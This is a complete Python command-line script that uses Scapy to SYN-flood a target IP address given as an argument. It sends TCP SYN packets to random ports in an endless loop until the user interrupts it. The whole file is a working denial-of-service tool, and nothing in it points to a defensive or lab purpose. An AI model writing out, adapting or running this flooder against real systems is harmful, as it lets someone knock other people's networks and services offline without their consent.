#!/usr/bin/env python3

import random
import argparse
from scapy.all import IP, TCP, send

def main():
    parser = argparse.ArgumentParser(description="Scapy SYN Flood")
    parser.add_argument("--target", help="Target IP address", required=True)
    parser.add_argument("--iface", help="Interface to use", required=True)
    args = parser.parse_args()

    print(f"[+] Starting SYN Flood on {args.target} via {args.iface}")
    count = 0

    try:
        while True:
            src_port = random.randint(1024, 65535)
            dst_port = random.randint(1, 65535)
            ip = IP(dst=args.target)
            tcp = TCP(sport=src_port, dport=dst_port, flags="S", seq=1000)
            pkt = ip / tcp
            send(pkt, iface=args.iface, verbose=0)
            count += 1
            if count % 100 == 0:
                print(f"[+] Sent {count} SYNs...")
    except KeyboardInterrupt:
        print(f"\n[!] Stopped. Total SYNs sent: {count}")

if __name__ == "__main__":
    main()
